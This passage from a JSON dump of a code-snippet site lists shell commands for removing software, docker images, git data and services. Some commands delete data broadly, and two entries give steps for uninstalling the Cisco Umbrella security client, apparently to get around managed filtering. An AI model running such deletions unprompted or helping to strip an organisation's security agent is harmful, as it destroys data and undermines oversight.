    "link": null,
    "title": " remotelog muirey03 github",
    "description": "#include <RemoteLog.h> \n",
    "reg_date": "2021-10-11T22:11:14.000Z"
  },
  {
    "id": 4050,
    "keyword": null,
    "link": null,
    "title": " remove a folder from git tracking",
    "description": "git rm -r --cached path_to_your_folder/ \nRemove the folder from your local git tracking, but keep it on your disk.  git rm -r --cached path_to_your_folder/ \n",
    "reg_date": "2021-10-11T22:11:14.000Z"
  },
  {
    "id": 4051,
    "keyword": null,
    "link": null,
    "title": " remove all .orig files mac terminal",
    "description": "find . -name '*.orig' -delete\n",
    "reg_date": "2021-10-11T22:11:14.000Z"
  },
  {
    "id": 4052,
    "keyword": null,
    "link": null,
    "title": " remove all cache ubuntu",
    "description": "$ sudo apt-get clean\n//delete cash  // systemd-resolve --statistics systemd-resolve --flush-caches\n",
    "reg_date": "2021-10-11T22:11:14.000Z"
  },
  {
    "id": 4053,
    "keyword": null,
    "link": null,
    "title": " remove all containers docker",
    "description": "# List all containers (only IDs) docker ps -aq # Stop all running containers docker stop $(docker ps -aq) # Remove all containers docker rm $(docker ps -aq) # Remove all images docker rmi $(docker images -q)\ndocker stop $(docker ps -a -q) docker rm $(docker ps -a -q)\ndocker rm $(docker ps -a -q)\n$ docker rm $(docker ps -a -q) \ndocker rm $(docker ps -aq)\ndocker rmi $(docker images -q)\n",
    "reg_date": "2021-10-11T22:11:15.000Z"
  },
  {
    "id": 4054,
    "keyword": null,
    "link": null,
    "title": " remove all docker iamges commandl",
    "description": "docker rmi -f $(docker images -a -q) \ndocker stop $(docker ps -a -q) docker rm $(docker ps -a -q)\n",
    "reg_date": "2021-10-11T22:11:15.000Z"
  },
  {
    "id": 4055,
    "keyword": null,
    "link": null,
    "title": " remove all docker images",
    "description": "docker rmi -f $(docker images -a -q) \n# List all containers (only IDs) docker ps -aq # Stop all running containers docker stop $(docker ps -aq) # Remove all containers docker rm $(docker ps -aq) # Remove all images docker rmi $(docker images -q)\ndocker rmi $(docker images --filter \"dangling=true\" -q --no-trunc)\ndocker rm $(docker ps -a -q)\ndocker rmi $(docker images -a -q) \n$images = docker images -a -q foreach ($image in $images) { docker image rm $image -f } \n",
    "reg_date": "2021-10-11T22:11:15.000Z"
  },
  {
    "id": 4056,
    "keyword": null,
    "link": null,
    "title": " remove all untaged images",
    "description": "docker rmi $(docker images | grep \"^<none>\" | awk \"{print $3}\")\n",
    "reg_date": "2021-10-11T22:11:15.000Z"
  },
  {
    "id": 4057,
    "keyword": null,
    "link": null,
    "title": " remove angular cli",
    "description": "npm uninstall -g @angular/cli npm cache clean --force \n",
    "reg_date": "2021-10-11T22:11:15.000Z"
  },
  {
    "id": 4058,
    "keyword": null,
    "link": null,
    "title": " remove apache2 from ubuntu",
    "description": "#stop the apache2 service  $ sudo systemctl stop apache2   #remove apache2 packages $ sudo apt-get purge apache2 apache2-utils apache2-bin apache2.2-common  # cleanup $ sudo apt-get autoremove  # check if the apache has been removed: #1- following command line should return a blank line $ which apache2    # 2- following command line should return apache2: Failed to start apache2.service: Unit apache2.service not found. $ sudo systemctl start apache2   \nsudo apt-get remove --purge apache2 apache2-data apache2-utils\nsudo apt autoremove sudo apt remove apache2 sudo apt-get purge apache2 apache2-utils apache2-bin apache2.2-common\n$sudo service apache2 stop  $ sudo apt-get purge apache2 apache2-utils apache2.2-bin apache2-common $ sudo apt-get autoremove  $ whereis apache2\n#How to completely remove Apache2 on Ubuntu 20.04 and similar distributions.  #stop the apache2 service  $ sudo systemctl stop apache2   #remove apache2 packages $ sudo apt-get purge apache2 apache2-utils apache2-bin apache2.2-common  # cleanup $ sudo apt-get autoremove  # check if the apache has been removed: #1- following command line should return a blank line $ which apache2     # 2- following command line should return apache2: Failed to start apache2.service: Unit apache2.service not found. $ sudo systemctl start apache2    @Oceangreen Technology - We Work For Excellence\n",
    "reg_date": "2021-10-11T22:11:15.000Z"
  },
  {
    "id": 4059,
    "keyword": null,
    "link": null,
    "title": " remove apache ubuntu",
    "description": "#stop the apache2 service  $ sudo systemctl stop apache2   #remove apache2 packages $ sudo apt-get purge apache2 apache2-utils apache2-bin apache2.2-common  # cleanup $ sudo apt-get autoremove  # check if the apache has been removed: #1- following command line should return a blank line $ which apache2    # 2- following command line should return apache2: Failed to start apache2.service: Unit apache2.service not found. $ sudo systemctl start apache2   \nsudo apt autoremove sudo apt remove apache2 sudo apt-get purge apache2 apache2-utils apache2-bin apache2.2-common\n#How to completely remove Apache2 on Ubuntu 20.04 and similar distributions.  #stop the apache2 service  $ sudo systemctl stop apache2   #remove apache2 packages $ sudo apt-get purge apache2 apache2-utils apache2-bin apache2.2-common  # cleanup $ sudo apt-get autoremove  # check if the apache has been removed: #1- following command line should return a blank line $ which apache2     # 2- following command line should return apache2: Failed to start apache2.service: Unit apache2.service not found. $ sudo systemctl start apache2    @Oceangreen Technology - We Work For Excellence\n",
    "reg_date": "2021-10-11T22:11:15.000Z"
  },
  {
    "id": 4060,
    "keyword": null,
    "link": null,
    "title": " remove app ubuntu terminal",
    "description": "sudo apt-get remove --purge <app name>\n",
    "reg_date": "2021-10-11T22:11:16.000Z"
  },
  {
    "id": 4061,
    "keyword": null,
    "link": null,
    "title": " remove ciso umbrella",
    "description": "1. Open Powershell in Administrative Mode 2. Paste The Code Below & Enter  wmic Product where \"name='Umbrella Roaming Client'\" call uninstall 3. Restart PC & Cisco Umbrella | Umbrela Roaming Client Will Be Gone  ## Contact Rigby#9052 on Discord If Any Problems Occured ##\n",
    "reg_date": "2021-10-11T22:11:16.000Z"
  },
  {
    "id": 4062,
    "keyword": null,
    "link": null,
    "title": " remove debian gnu/linux - continue with install process",
    "description": "Open command prompt: cmd Type bcdedit (as Marcos suggested) You will find the booting partitions (this term doesn't really exist) Spot the partition that says \"Continue with installation\"  as a description Copy its {identifier} (yeah, that long number) Finally, type bcdedit /delete {identifier},  where in the place of identifier you have to put the identifier you selected. (Make sure to keep the identifier between braces {..} ). Type bcdedit to confirm deletion\n",
    "reg_date": "2021-10-11T22:11:16.000Z"
  },
  {
    "id": 4063,
    "keyword": null,
    "link": null,
    "title": " remove docker container",
    "description": "# List all containers (only IDs) docker ps -aq # Stop all running containers docker stop $(docker ps -aq) # Remove all containers docker rm $(docker ps -aq) # Remove all images docker rmi $(docker images -q)\ndocker stop $(docker ps -a -q) docker rm $(docker ps -a -q)\ndocker rm $(docker ps -a -q)\ndocker container rm $(docker container ls &ndash;aq) docker container stop $(docker container ls &ndash;aq) && docker system prune &ndash;af &ndash;&ndash;volumes\ndocker rm $(docker ps -aq)\nsudo docker stop $(docker ps -a -q) sudo docker rm $(docker ps -a -q)\n",
    "reg_date": "2021-10-11T22:11:16.000Z"
  },
  {
    "id": 4064,
    "keyword": null,
    "link": null,
    "title": " remove docker image",
    "description": "# List all containers (only IDs) docker ps -aq # Stop all running containers docker stop $(docker ps -aq) # Remove all containers docker rm $(docker ps -aq) # Remove all images docker rmi $(docker images -q)\ndocker system prune -a\n$ docker system prune --all \ndocker image rm [image id]\ndocker system prune -a \ndocker rmi Image Image\n",
    "reg_date": "2021-10-11T22:11:16.000Z"
  },
  {
    "id": 4065,
    "keyword": null,
    "link": null,
    "title": " remove docker images",
    "description": "docker rmi -f $(docker images -a -q) \ndocker system prune -a\ndocker image rm [image id]\ndocker system prune -a \ndocker image prune\ndocker image rm [OPTIONS] IMAGE [IMAGE...] #[OPTIONS] --force , -f\t\tForce removal of the image --no-prune\t\tDo not delete untagged parents\n",
    "reg_date": "2021-10-11T22:11:16.000Z"
  },
  {
    "id": 4066,
    "keyword": null,
    "link": null,
    "title": " remove docker ubuntu",
    "description": "To completely uninstall Docker:  Step 1  dpkg -l | grep -i docker To identify what installed package you have:  Step 2  sudo apt-get purge -y docker-engine docker docker.io docker-ce docker-ce-cli sudo apt-get autoremove -y --purge docker-engine docker docker.io docker-ce   The above commands will not remove images, containers, volumes, or user created configuration files on your host. If you wish to delete all images, containers, and volumes run the following commands:  sudo rm -rf /var/lib/docker /etc/docker sudo rm /etc/apparmor.d/docker sudo groupdel docker sudo rm -rf /var/run/docker.sock You have removed Docker from the system completely.\ndpkg -l | grep -i docker\n",
    "reg_date": "2021-10-11T22:11:16.000Z"
  },
  {
    "id": 4067,
    "keyword": null,
    "link": null,
    "title": " remove docker volume",
    "description": "docker-compose down docker rm -f $(docker ps -a -q) docker volume rm $(docker volume ls -q) docker-compose up -d\n# Procedure # 1- Stop the container(s) using the following command: docker-compose down # 2- Delete all containers using the following command: docker rm -f $(docker ps -a -q) # 3-Delete all volumes using the following command: docker volume rm $(docker volume ls -q) # 4-Restart the containers using the following command: docker-compose up -d\ndocker volume rm $(docker volume ls -q)\ndocker rm -v container_name \n",
    "reg_date": "2021-10-11T22:11:17.000Z"
  },
  {
    "id": 4068,
    "keyword": null,
    "link": null,
    "title": " remove file extension bash",
    "description": "$ filename=foo.txt $ echo \"${filename%.*}\" foo\n",
    "reg_date": "2021-10-11T22:11:17.000Z"
  },
  {
    "id": 4069,
    "keyword": null,
    "link": null,
    "title": " remove file from git tracking",
    "description": "git rm --cached <file_name>\n/* Remove Git tracking from an entire folder/directory */  cd project-name // Navigate to the project directory rm -rf .git // Remove git tracking  \ngit rm --cached <file>  git rm -r --cached <folder>\nUpdate your . gitignore file &ndash; for instance, add a folder you don't want to track to . gitignore . git rm -r --cached . &ndash; Remove all tracked files, including wanted and unwanted. Your code will be safe as long as you have saved locally. git add . &ndash; All files will be added back in, except those in . gitignore .\n",
    "reg_date": "2021-10-11T22:11:17.000Z"
  },
  {
    "id": 4070,
    "keyword": null,
    "link": null,
    "title": " remove first 3 commits",
    "description": "git reset --hard HEAD~1 \ngit push origin HEAD --force \ngit reset --hard <sha1-commit-id> \n",
    "reg_date": "2021-10-11T22:11:17.000Z"
  },
  {
    "id": 4071,
    "keyword": null,
    "link": null,
    "title": " remove first word of pipe output",
    "description": "Just use cut command with a defined delimeter as a space ' ' and choose to cut since second word match until end '-f2-' as for example: cat file.txt | cut -d ' ' -f2- If for example space delimiter ' ' is repeated in your line check how many times, since matching word number must then be adapted. For example: history | cut -d ' ' -f4-\n",
    "reg_date": "2021-10-11T22:11:17.000Z"
  },
  {
    "id": 4072,
    "keyword": null,
    "link": null,
    "title": " remove folder from repo but keep locally",
    "description": "git rm -r --cached File-or-FolderName git commit -m \"Removed folder from repository\" git push origin master\n",
    "reg_date": "2021-10-11T22:11:17.000Z"
  },
  {
    "id": 4073,
    "keyword": null,
    "link": null,
    "title": " remove git credentials terminal",
    "description": "git config --unset credential.helper \n",
    "reg_date": "2021-10-11T22:11:17.000Z"
  },
  {
    "id": 4074,
    "keyword": null,
    "link": null,
    "title": " remove git from folder",
    "description": "rm -rf .git \ncmd rmdir /S .git\n/* Remove Git tracking from an entire folder/directory */  cd project-name // Navigate to the project directory rm -rf .git // Remove git tracking  \nrm -rf .git* \ngit rm -r --cached <folder> git commit -m \"Removed Folder\" git push origin master\n# the -r option will recursively delete the folder git rm -r folder-name # commit changes git commit -m \"Remove duplicated directory\"\n",
    "reg_date": "2021-10-11T22:11:17.000Z"
  },
  {
    "id": 4075,
    "keyword": null,
    "link": null,
    "title": " remove git from folder windows",
    "description": "cmd rmdir /S .git\nrm -rf .git* \n",
    "reg_date": "2021-10-11T22:11:18.000Z"
  },
  {
    "id": 4076,
    "keyword": null,
    "link": null,
    "title": " remove git from project",
    "description": "rm -rf .git \n/* Remove Git tracking from an entire folder/directory */  cd project-name // Navigate to the project directory rm -rf .git // Remove git tracking  \nrm -rf .git* \n// On windows del /F /S /Q /A .git\n//Windows: del /F /S /Q /A .git  rmdir .git\n",
    "reg_date": "2021-10-11T22:11:18.000Z"
  },
  {
    "id": 4077,
    "keyword": null,
    "link": null,
    "title": " remove git repository vscode",
    "description": "sudo rm -rf .git\n",
    "reg_date": "2021-10-11T22:11:18.000Z"
  },
  {
    "id": 4078,
    "keyword": null,
    "link": null,
    "title": " remove git repository windows",
    "description": "Go to the directory where you want to delete your .git folder then type in cmd  rmdir /S .git.\n// On windows del /F /S /Q /A .git\n",
    "reg_date": "2021-10-11T22:11:18.000Z"
  },
  {
    "id": 4079,
    "keyword": null,
    "link": null,
    "title": " remove git tag",
    "description": "# Add tags git tag tagName  # Push tags git push --follow-tags  # Delete locally git tag -d tagName  # Delete remote tag: git tag -d tagName git push origin :tagName\ngit push --delete origin tagname\nLocal: git tag -d <tag_name> Remote: git push --delete origin tagname\ngit push --delete origin tagname \ngit push origin :tagname \n",
    "reg_date": "2021-10-11T22:11:18.000Z"
  },
  {
    "id": 4080,
    "keyword": null,
    "link": null,
    "title": " remove git tracking",
    "description": "/* Remove Git tracking from an entire folder/directory */  cd project-name // Navigate to the project directory rm -rf .git // Remove git tracking  \n//Windows: del /F /S /Q /A .git  rmdir .git\ngit rm -r --cached <folder> \ngit rm --cached <file> \n",
    "reg_date": "2021-10-11T22:11:18.000Z"
  },
  {
    "id": 4081,
    "keyword": null,
    "link": null,
    "title": " remove google chrome linux",
    "description": "sudo apt purge google-chrome-stable\n",
    "reg_date": "2021-10-11T22:11:19.000Z"
  },
  {
    "id": 4082,
    "keyword": null,
    "link": null,
    "title": " remove heroku remote",
    "description": "git remote rm heroku \n$ git remote rm heroku // delete the heroku remote  $ heroku git:remote -a NAME_OF_HEROKU_APP // reatributte the heroku app\n$ git remote rm heroku // delete the heroku remote  $ heroku git:remote -a NAME_OF_HEROKU_APP // reatributte the heroku app \n",
    "reg_date": "2021-10-11T22:11:19.000Z"
  },
  {
    "id": 4083,
    "keyword": null,
    "link": null,
    "title": " remove home icon ubuntu",
    "description": "# Ubuntu 18.04 LTS  gsettings set org.gnome.nautilus.desktop trash-icon-visible false gsettings set org.gnome.shell.extensions.desktop-icons show-trash false   ## Ubuntu 20 gsettings set org.gnome.shell.extensions.desktop-icons show-trash false gsettings set org.gnome.shell.extensions.desktop-icons show-home false\n",
    "reg_date": "2021-10-11T22:11:19.000Z"
  },
  {
    "id": 4084,
    "keyword": null,
    "link": null,
    "title": " remove index.lock git",
    "description": "# On linux/unix/gitbash/cygwin, try sudo rm -f ./.git/index.lock  # On Windows Command Prompt, try: del .git\\index.lock\n",
    "reg_date": "2021-10-11T22:11:19.000Z"
  },
  {
    "id": 4085,
    "keyword": null,
    "link": null,
    "title": " remove iptables rule",
    "description": "#find line number of rule $ sudo iptables -L INPUT --line-numbers ## delete rule by number $ sudo iptables -D INPUT 1 . . .\n# flag -D for delete sudo iptables -D INPUT -i eth0 -p tcp --dport 22 -j ACCEPT\nsudo iptables -F\n",
    "reg_date": "2021-10-11T22:11:19.000Z"
  },
  {
    "id": 4086,
    "keyword": null,
    "link": null,
    "title": " remove last commit from remote",
    "description": "git reset HEAD^ # remove commit locally git push origin +HEAD # force-push the new HEAD commit \n1 $git rebase -i HEAD~2 \ngit push origin +HEAD^:<name of your branch, most likely 'master'> \n",
    "reg_date": "2021-10-11T22:11:19.000Z"
  },
  {
    "id": 4087,
    "keyword": null,
    "link": null,
    "title": " remove last space from line",
    "description": "Use either one of both next commands with sed 's/to_replace/replace/': sed 's/ *$//' file sed 's/[[:blank:]]*$//' file\n",
    "reg_date": "2021-10-11T22:11:19.000Z"
  },
  {
    "id": 4088,
    "keyword": null,
    "link": null,
    "title": " remove letter in string bash",
    "description": "echo \"Hello world\" | tr -d o \n",
    "reg_date": "2021-10-11T22:11:19.000Z"
  },
  {
    "id": 4089,
    "keyword": null,
    "link": null,
    "title": " remove local changes git",
    "description": "# Discarding local changes (permanently) to a file: git checkout -- <file>  # Discard all local changes to all files permanently: git reset --hard\ngit fetch  # will fetch the latest changes on the remote git reset --hard origin/master # will set your local branch to match the representation of the remote just pulled down. \ngit clean -df git checkout -- . \ngit checkout -- . \ngit checkout HEAD -- my-file.txt\ngit reset HEAD git checkout . \n",
    "reg_date": "2021-10-11T22:11:19.000Z"
  },
  {
    "id": 4090,
    "keyword": null,
    "link": null,
    "title": " remove mariadb",
    "description": " $ sudo apt-get purge mariadb-server \n",
    "reg_date": "2021-10-11T22:11:19.000Z"
  },
  {
    "id": 4091,
    "keyword": null,
    "link": null,
    "title": " remove mongodb from mac",
    "description": "$ launchctl list | grep mongo $ launchctl remove homebrew.mxcl.mongodb $ pkill -f mongod $ brew uninstall mongodb\nrm -rf /usr/local/var/mongodbrm -rf /data/db\n",
    "reg_date": "2021-10-11T22:11:20.000Z"
  },
  {
    "id": 4092,
    "keyword": null,
    "link": null,
    "title": " remove mysql",
    "description": "sudo apt-get remove --purge mysql* -y sudo apt-get autoremove -y sudo apt-get autoclean\nDELETE FROM table_name WHERE some_column = some_value \napt-get --purge remove \"mysql*\"\nTo delete data from a table, you use the MySQL DELETE statement. The following illustrates the syntax of the DELETE statement:  DELETE FROM table_name WHERE condition; In this statement:  First, specify the table from which you delete data. Second, use a condition to specify which rows to delete in the WHERE clause. The DELETE statement will delete rows that match the condition,\n",
    "reg_date": "2021-10-11T22:11:20.000Z"
  },
  {
    "id": 4093,
    "keyword": null,
    "link": null,
    "title": " remove network linux",
    "description": "sudo ip link delete\n",
    "reg_date": "2021-10-11T22:11:20.000Z"
  },
  {
    "id": 4094,
    "keyword": null,
    "link": null,
    "title": " remove nginx",
    "description": "sudo apt-get purge nginx nginx-common \nsudo apt-get remove nginx* --purge\n",
    "reg_date": "2021-10-11T22:11:20.000Z"
  },
  {
    "id": 4095,
    "keyword": null,
    "link": null,
    "title": " remove nginx from ubuntu",
    "description": "sudo apt-get remove nginx nginx-common or sudo apt-get purge nginx nginx-common  sudo apt-get autoremove\nsudo apt-get purge nginx nginx-common \nsudo apt-get remove nginx* --purge\n",
    "reg_date": "2021-10-11T22:11:20.000Z"
  },
  {
    "id": 4096,
    "keyword": null,
    "link": null,
    "title": " remove oh my zsh ubuntu",
    "description": "run:  uninstall oh_my_zsh  Restart your terminal for changes to be effective.\nsource ~/.oh-my-zsh/tools/uninstall.sh \n",
    "reg_date": "2021-10-11T22:11:20.000Z"
  },
  {
    "id": 4097,
    "keyword": null,
    "link": null,
    "title": " remove orphan packages arch linux",
    "description": "sudo pacman -R $(pacman -Qtdq)\n",
    "reg_date": "2021-10-11T22:11:20.000Z"
  },
  {
    "id": 4098,
    "keyword": null,
    "link": null,
    "title": " remove orphan packages manjaro",
    "description": "sudo pacman -R $(pacman -Qtdq)\n",
    "reg_date": "2021-10-11T22:11:21.000Z"
  },
  {
    "id": 4099,
    "keyword": null,
    "link": null,
    "title": " remove phpmyadmin from ubuntu",
    "description": "#remove phpmyadmin #1 sudo apt-get purge phpmyadmin or sudo apt-get remove phpmyadmin #2 sudo apt-get autoremove\nsudo apt-get purge phpmyadmin\n$ sudo apt-get purge phpmyadmin\nsudo rm -r /var/lib/dpkg/info/phpmyadmin.* \\ && sudo apt-get clean \\ && sudo apt-get update \\ && sudo apt-get remove phpmyadmin \\ && sudo apt-get purge phpmyadmin  sudo apt-get update \\ sudo apt-get -f install \\ sudo apt autoremove\n",
    "reg_date": "2021-10-11T22:11:21.000Z"
  },
  {
    "id": 4100,
    "keyword": null,
    "link": null,
    "title": " remove pods from xcode project terminal",
    "description": "sudo gem install cocoapods-deintegrate cocoapods-clean pod deintegrate pod clean rm Podfile\nsudo gem install cocoapods-deintegrate\n",
    "reg_date": "2021-10-11T22:11:21.000Z"
  },
  {
    "id": 4101,
    "keyword": null,
    "link": null,
    "title": " remove port binding windows",
    "description": "netstat -a -n -o | findstr :80 TaskKill /PID pidnum\nFOR /F \"tokens=4 delims= \" %%P IN ('netstat -a -n -o ^| findstr :8080') DO TaskKill.exe /PID %%P \nfindstr :8080 \n%%P instead of %P \n",
    "reg_date": "2021-10-11T22:11:21.000Z"
  },
  {
    "id": 4102,
    "keyword": null,
    "link": null,
    "title": " remove port ufw",
    "description": "$ sudo ufw status numbered Status: active       To                         Action      From      --                         ------      ---- [ 1] Apache Full                ALLOW IN    Anywhere                   [ 2] OpenSSH                    ALLOW IN    Anywhere                   [ 3] Apache Full (v6)           ALLOW IN    Anywhere (v6)              [ 4] OpenSSH (v6)               ALLOW IN    Anywhere (v6)  $ sudo ufw delete 3 Deleting:  allow 'Apache Full' Proceed with operation (y|n)? y Rule deleted (v6) \n",
    "reg_date": "2021-10-11T22:11:21.000Z"
  },
  {
    "id": 4103,
    "keyword": null,
    "link": null,
    "title": " remove postgresql ubuntu",
    "description": "sudo apt-get --purge remove postgresql sudo apt-get purge postgresql* sudo apt-get --purge remove postgresql postgresql-doc postgresql-common\nsudo apt-get --purge remove postgresql postgresql-doc postgresql-common \nsudo aptitude purge postgresql postgresql-common sudo dpkg -P postgresql-8.4  sudo find / -name postgresql -exec rm -Rf {} \\; sudo find / -name pgsql -exec rm -Rf {} \\; sudo find / -name psql -exec rm -Rf {} \\;  sudo userdel postgres \n",
    "reg_date": "2021-10-11T22:11:21.000Z"
  },
  {
    "id": 4104,
    "keyword": null,
    "link": null,
    "title": " remove ppa from ubuntu",
    "description": "sudo add-apt-repository --remove ppa:whatever/ppa # or sudo apt-add-repository --remove 'deb some/repo your_distro main'\nsudo add-apt-repository --remove ppa:dhor/myway\nsudo add-apt-repository --remove ppa:whatever/ppa sudo apt-get install ppa-purge sudo ppa-purge ppa:whatever/ppa sudo apt-get purge package_name\nsudo add-apt-repository --remove ppa:PPA_Name/ppa\n",
    "reg_date": "2021-10-11T22:11:21.000Z"
  },
  {
    "id": 4105,
    "keyword": null,
    "link": null,
    "title": " remove pyqt5 with conda",
    "description": "pip3 uninstall pyqt5 \npip3 uninstall pyqt5\n",
    "reg_date": "2021-10-11T22:11:22.000Z"
  },
  {
    "id": 4106,
    "keyword": null,
    "link": null,
    "title": " remove rabbitmq linux",
    "description": "# View the related list of rabbitmq installation #  yum list | grep rabbitmq  ## Uninstall related content that rabbitmq has installed ##  yum -y remove rabbitmq-server.noarch   ### View the related list of erlang installation and Uninstall erlang ###  yum list | grep erlang  ### Uninstall related content installed by erlang ###  yum -y remove erlang-* yum remove erlang.x86_64  ### Delete all related files ###  rm -rf /usr/lib64/erlang  rm -rf /var/lib/rabbitmq rm -rf /usr/local/erlang rm -rf /usr/local/rabbitmq\n",
    "reg_date": "2021-10-11T22:11:22.000Z"
  },
  {
    "id": 4107,
    "keyword": null,
    "link": null,
    "title": " remove remote git",
    "description": "git remote remove origin \n$ git remote -v # View current remotes > origin  https://github.com/OWNER/REPOSITORY.git (fetch) > origin  https://github.com/OWNER/REPOSITORY.git (push) > destination  https://github.com/FORKER/REPOSITORY.git (fetch) > destination  https://github.com/FORKER/REPOSITORY.git (push)  $ git remote rm destination # Remove remote $ git remote -v # Verify it's gone > origin  https://github.com/OWNER/REPOSITORY.git (fetch) > origin  https://github.com/OWNER/REPOSITORY.git (push)\n# The example will remove the github remote.  # Note that the command will not delete the repository,  # just the local reference. git remote rm origin\ngit remote rm remote_name\ngit remote set-url origin git://new.url.here \ngit remote add origin https://github.com/dk9071091/avnikreactjs.git git branch -M main git push -u origin main\n",
    "reg_date": "2021-10-11T22:11:22.000Z"
  },
  {
    "id": 4108,
    "keyword": null,
    "link": null,
    "title": " remove remote origin",
    "description": "git remote remove origin \n$ git remote -v # View current remotes > origin  https://github.com/OWNER/REPOSITORY.git (fetch) > origin  https://github.com/OWNER/REPOSITORY.git (push) > destination  https://github.com/FORKER/REPOSITORY.git (fetch) > destination  https://github.com/FORKER/REPOSITORY.git (push)  $ git remote rm destination # Remove remote $ git remote -v # Verify it's gone > origin  https://github.com/OWNER/REPOSITORY.git (fetch) > origin  https://github.com/OWNER/REPOSITORY.git (push)\n# The example will remove the github remote.  # Note that the command will not delete the repository,  # just the local reference. git remote rm origin\n",
    "reg_date": "2021-10-11T22:11:22.000Z"
  },
  {
    "id": 4109,
    "keyword": null,
    "link": null,
    "title": " remove snap package",
    "description": "sudo snap remove <package name>\nsudo snap remove <package>\nsudo snap remove gimp\n",
    "reg_date": "2021-10-11T22:11:22.000Z"
  },
  {
    "id": 4110,
    "keyword": null,
    "link": null,
    "title": " remove space at end of each line file",
    "description": "Use either one of both next commands with sed 's/to_replace/replace/': sed 's/ *$//' file sed 's/[[:blank:]]*$//' file\n",
    "reg_date": "2021-10-11T22:11:22.000Z"
  },
  {
    "id": 4111,
    "keyword": null,
    "link": null,
    "title": " remove space at end of line file",
    "description": "Use either one of both next commands with sed 's/to_replace/replace/': sed 's/ *$//' file sed 's/[[:blank:]]*$//' file\n",
    "reg_date": "2021-10-11T22:11:22.000Z"
  },
  {
    "id": 4112,
    "keyword": null,
    "link": null,
    "title": " remove stash files git",
    "description": "# remove all stashed files at once: git stash clear # remove a single stashed state from the stash list git stash drop 'stash@{index}'\ngit stash clear\ngit stash drop stash@{index}   // here index will be shown after getting stash list.\n",
    "reg_date": "2021-10-11T22:11:22.000Z"
  },
  {
    "id": 4113,
    "keyword": null,
    "link": null,
    "title": " remove stopped containers",
    "description": "$ docker rm $(docker ps -a -q) \ndocker container rm [container id]\n",
    "reg_date": "2021-10-11T22:11:22.000Z"
  },
  {
    "id": 4114,
    "keyword": null,
    "link": null,
    "title": " remove submodule git",
    "description": "To remove a submodule you need to:  Delete the relevant section from the .gitmodules file. Stage the .gitmodules changes git add .gitmodules Delete the relevant section from .git/config. Run git rm --cached path_to_submodule (no trailing slash). Run rm -rf .git/modules/path_to_submodule (no trailing slash). Commit git commit -m \"Removed submodule \" Delete the now untracked submodule files rm -rf path_to_submodule\n# Remove the submodule entry from .git/config git submodule deinit -f path/to/submodule  # Remove the submodule directory from the superproject's .git/modules directory rm -rf .git/modules/path/to/submodule  # Remove the entry in .gitmodules and remove the submodule directory located at path/to/submodule git rm -f path/to/submodule \nmv subfolder subfolder_tmp git submodule deinit subfolder git rm --cached subfolder mv subfolder_tmp subfolder git add subfolder \nOption 1. Remove .gitmodules file from project  Option 2. rm -rf .git/modules/path_to_submodule  Remember to commit the remove change!\n",
    "reg_date": "2021-10-11T22:11:23.000Z"
  },
  {
    "id": 4115,
    "keyword": null,
    "link": null,
    "title": " remove systemd service",
    "description": "# My recipe for systemd service obliteration systemctl stop [servicename] systemctl disable [servicename] rm /etc/systemd/system/[servicename] rm /etc/systemd/system/[servicename] # and symlinks that might be related rm /usr/lib/systemd/system/[servicename]  rm /usr/lib/systemd/system/[servicename] # and symlinks that might be related systemctl daemon-reload systemctl reset-failed\n",
    "reg_date": "2021-10-11T22:11:23.000Z"
  },
  {
    "id": 4116,
    "keyword": null,
    "link": null,
    "title": " remove the last commit git without losing changes",
    "description": "git reset HEAD~1 --soft   \n",
    "reg_date": "2021-10-11T22:11:23.000Z"
  },
  {
    "id": 4117,
    "keyword": null,
    "link": null,
    "title": " remove trash linux",
    "description": "$ cd .local/share/Trash/\n",
    "reg_date": "2021-10-11T22:11:23.000Z"
  },
  {
    "id": 4118,
    "keyword": null,
    "link": null,
    "title": " remove umbrella roaming client",
    "description": "1. Open Powershell in Administrative Mode 2. Paste The Code Below & Enter  wmic Product where \"name='Umbrella Roaming Client'\" call uninstall 3. Restart PC & Cisco Umbrella | Umbrela Roaming Client Will Be Gone  ## Contact Rigby#9052 on Discord If Any Problems Occured ##\n",
    "reg_date": "2021-10-11T22:11:23.000Z"
  },
  {
    "id": 4119,
    "keyword": null,
    "link": null,
    "title": " remove unused images docker manually",
    "description": "$ docker rmi $(docker images -q -f dangling=true)\ndocker image prune\ndocker system prune\ndocker image rm [OPTIONS] IMAGE_ID [IMAGE_ID...] #[OPTIONS] --force , -f\t\tForce removal of the image --no-prune\t\tDo not delete untagged parents\n",
    "reg_date": "2021-10-11T22:11:23.000Z"
  },
  {
    "id": 4120,
    "keyword": null,
    "link": null,
    "title": " remove valet from mac",
    "description": "composer global remove laravel/valet brew uninstall nginx brew uninstall mysql brew uninstall php@8.0 brew uninstall dnsmasq rm -rf ~/.valet rm /usr/local/bin/valet\n",
    "reg_date": "2021-10-11T22:11:24.000Z"
  },
  {
    "id": 4121,
    "keyword": null,
    "link": null,
    "title": " remove virtualbox from ubuntu",
    "description": " #Uninstall VirtualBox first.  sudo apt-get remove --purge virtualbox  #Run these commands to delete all virtual machines and settings and Virtual Hard Drives:  sudo rm ~/\"VirtualBox VMs\" -Rf sudo rm ~/.config/VirtualBox/ -Rf #If you want to install it again. Run this command:  sudo apt-get install virtualbox #Additionally, check:  sudo ps aux | grep -i \"vbox\" #Kill any \"ghost\" processes you may think are relevant.  sudo pkill VBox*\n",
    "reg_date": "2021-10-11T22:11:24.000Z"
  },
  {
    "id": 4122,
    "keyword": null,
    "link": null,
    "title": " remove visual paradigm linux",
    "description": "//check in the terminal if there is a package that starts with 'visual' dpkg-query -l 'Visual*'  //if yes dpkg -r [package name]  //if no.  cd /opt sudo rm -R [visual_paradigm_directory_name]  Then check your homedirectory for a directory called &ldquo;VisualParadigm&rdquo; (default name). This will contain your so called workspace as well as several data files which Visual Paradigm uses (license files, log files, etc.). If you want to save some of your Visual Paradigm projects then this is where you&rsquo;ll find them (most likely: ~/VisualParadigm/ws/VPProjects).  If you&rsquo;re fully sure about not needing to save any data then also remove this directory (\"~/VisualParadigm\").\n",
    "reg_date": "2021-10-11T22:11:24.000Z"
  },
  {
    "id": 4123,
    "keyword": null,
    "link": null,
    "title": " remove xampp from ubuntu",
    "description": " // creats an uninstall exec file  sudo chmod +x /opt/lampp/uninstall    // call the exec file to uninstall ( an user interface it will appear )  sudo /opt/lampp/uninstall  \n$ sudo apt install net-tools /*    */\n",
    "reg_date": "2021-10-11T22:11:24.000Z"
  },
  {
    "id": 4124,
    "keyword": null,
    "link": null,
    "title": " removing a ipykernel in anaconda",
    "description": "jupyter kernelspec uninstall unwanted-kernel\n",
    "reg_date": "2021-10-11T22:11:24.000Z"
  },
  {
    "id": 4125,
    "keyword": null,
    "link": null,
    "title": " rename branch git",
